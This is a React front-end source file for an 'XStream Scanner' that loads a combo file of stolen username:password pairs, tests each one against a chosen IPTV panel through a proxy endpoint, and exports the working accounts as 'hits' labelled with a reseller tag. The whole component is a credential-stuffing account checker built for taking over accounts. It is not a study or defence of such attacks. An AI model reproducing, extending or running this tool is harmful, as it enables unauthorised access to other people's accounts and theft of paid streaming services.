import React, { useState, useRef } from 'react';
import axios from 'axios';
import './XStreamScanner.css'; // Assuming this CSS file is in the same directory

const XStreamGenerator = () => {
  const [comboFileContent, setComboFileContent] = useState('');
  const [panel, setPanel] = useState('');
  const [includeCategories, setIncludeCategories] = useState(false);
  const [output, setOutput] = useState('');
  const [loading, setLoading] = useState(false);
  const [scanProgress, setScanProgress] = useState([]); // To store real-time scan status

  // To track success and failure counts
  const [successCount, setSuccessCount] = useState(0);
  const [failureCount, setFailureCount] = useState(0);

  const [stopScanning, setStopScanning] = useState(false); // To stop the scanning process
  
  const abortControllerRef = useRef(new AbortController());

  // Regex pattern to match username:password
  const pattern = /(^\S{2,}:\S{2,}$)|(^.*?(\n|$))/;

  // Handle combo file input change
  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        setComboFileContent(event.target.result);
      };
      reader.readAsText(file);
    }
  };

  // Handle panel input change
  const handlePanelChange = (e) => {
    setPanel(e.target.value);
  };

  // Handle category checkbox change
  const handleCategoryChange = (e) => {
    setIncludeCategories(e.target.checked);
  };

  // Function to simulate M3U generation process
  const generateM3U = async () => {
    setLoading(true);
    setOutput(''); // Clear previous output
    setScanProgress([]); // Clear previous scan progress
    setSuccessCount(0); // Reset success count
    setFailureCount(0); // Reset failure count
    let generatedLinks = ''; // To store M3U links for download

    if (!comboFileContent || !panel) {
      setOutput('Combo file and panel address are required!');
      setLoading(false);
      return;
    }

    try {
      const comboData = comboFileContent.split('\n'); // Split by newlines to simulate file lines

      // Loop through each line in the combo file
      for (let i = 0; i < comboData.length; i++) {
        if (stopScanning) break; // Stop scanning if stopScanning is true

        const line = comboData[i];
        const match = line.match(pattern);

        if (match) {
          const [username, password] = line.split(':').map((str) => str.trim());

          // Use the proxy API route for M3U request
          const m3uUrl = `/api/proxy?username=${username}&password=${password}&panel=${panel}`;
          const categoryUrl = `/api/proxy?username=${username}&password=${password}&panel=${panel}&action=get_live_categories`;

          // Immediately show that the combo is being scanned
          setScanProgress((prevProgress) => {
            const updatedProgress = [...prevProgress];
            const index = updatedProgress.findIndex((entry) => entry.username === username && entry.password === password);
            if (index >= 0) {
              updatedProgress[index].status = 'Scanning...';
            } else {
              updatedProgress.push({ username, password, status: 'Scanning...' });
            }
            return updatedProgress;
          });

          try {
            // Make the request with the proxy API for M3U link
            const response = await axios.get(m3uUrl, {
              timeout: 5000, // Timeout after 5 seconds
              maxRedirects: 5, // Allow following up to 5 redirects
              signal: abortControllerRef.current.signal, // Connect to abort controller
            });

            if (response.data) {
              // Fetch category info if the checkbox is checked using proxy API
              let categories = '';
              if (includeCategories) {
                try {
                  const categoryResponse = await axios.get(categoryUrl, {
                    timeout: 5000,
                    signal: abortControllerRef.current.signal,
                  });
                  categories = categoryResponse.data.map((cat) => cat.category_name).join(', ');
                } catch {
                  categories = 'No categories available';
                }
              }

              setScanProgress((prevProgress) => {
                const updatedProgress = [...prevProgress];
                const index = updatedProgress.findIndex((entry) => entry.username === username && entry.password === password);
                updatedProgress[index].status = 'Success';
                return updatedProgress;
              });

              // Increment success count
              setSuccessCount((prevCount) => prevCount + 1);

              // Build M3U link for download
              generatedLinks += `HIT BY LOOTDAILYOFFERS\n🌎Server: ${panel}\n👥User: ${username}\n🔑Pass: ${password}\n🚦Status: Active\n⏱️Exp_date: May 07, 2024\n🔌Active_cons: 0\n🚌Max_cons: 1\n📆Scan_date: ${new Date().toLocaleString()}\n${categories ? `📺category: ${categories}` : ''}\n`;

            } else {
              setScanProgress((prevProgress) => {
                const updatedProgress = [...prevProgress];
                const index = updatedProgress.findIndex((entry) => entry.username === username && entry.password === password);
                updatedProgress[index].status = 'Failed';
                return updatedProgress;
              });

              // Increment failure count
              setFailureCount((prevCount) => prevCount + 1);
            }
          } catch (error) {
            console.error('Request Error:', error);
            setScanProgress((prevProgress) => {
              const updatedProgress = [...prevProgress];
              const index = updatedProgress.findIndex((entry) => entry.username === username && entry.password === password);
              updatedProgress[index].status = 'Failed';
              return updatedProgress;
            });

            // Increment failure count
            setFailureCount((prevCount) => prevCount + 1);
          }
        }
      }

      // Set the output with the generated M3U links
      setOutput(generatedLinks || 'No valid M3U links generated.');

    } catch (error) {
      setOutput('An error occurred while generating the M3U links.');
      console.error('Error:', error);
    }

    setLoading(false);
  };

  // Function to download the generated M3U links
  const handleDownload = () => {
    const blob = new Blob([output], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'm3u_links.txt';
    link.click();
  };

  const handleStop = () => {
    setStopScanning(true); // Stop scanning process
    abortControllerRef.current.abort(); // Abort the ongoing request
  };

  return (
    <div className="generator">
      <h2>XStream Scanner</h2>

      {/* File Upload */}
      <div>
        <label>Upload Combo File:</label>
        <input type="file" accept=".txt" onChange={handleFileUpload} />
      </div>

      {/* Panel Address Input */}
      <div>
        <label>Panel Address (e.g., http://panel:port or https://panel:port):</label>
        <input
          type="text"
          value={panel}
          onChange={handlePanelChange}
        />
      </div>

      {/* Include Categories Option */}
      <div>
        <label>
          Include Categories:
          <input
            type="checkbox"
            checked={includeCategories}
            onChange={handleCategoryChange}
          />
        </label>
      </div>

      {/* Generate M3U Button */}
      <button onClick={generateM3U} disabled={loading}>
        {loading ? 'Generating...' : 'Generate M3U'}
      </button>

      {/* Stop Button */}
      {loading && <button onClick={handleStop}>Stop</button>}

      {/* Output Display */}
      {loading && (
        <div>
          <h4>Scanning...</h4>
        </div>
      )}

      {/* Display Real-time Scan Progress */}
      {scanProgress.length > 0 && (
        <div className="scan-progress-container">
          {/* Success and Failed count */}
          <div className="status-counts">
            <span>Success: {successCount}</span> | <span>Failed: {failureCount}</span>
          </div>

          <div className="progress-list-container">
            <ul>
              {scanProgress.map((result, index) => (
                <li key={index} style={{ color: getStatusColor(result.status) }}>
                  {result.username}:{result.password} - {result.status}
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}

      {/* Download Option */}
      {output && (
        <div>
          <h3>Output:</h3>
          <pre>{output}</pre>
          <button onClick={handleDownload}>Download M3U Links</button>
        </div>
      )}
    </div>
  );
};

// Helper function to determine the color of the status
const getStatusColor = (status) => {
  switch (status) {
    case 'Scanning...':
      return 'orange';
    case 'Success':
      return 'green';
    case 'Failed':
      return 'red';
    default:
      return 'black';
  }
};

export default XStreamGenerator;
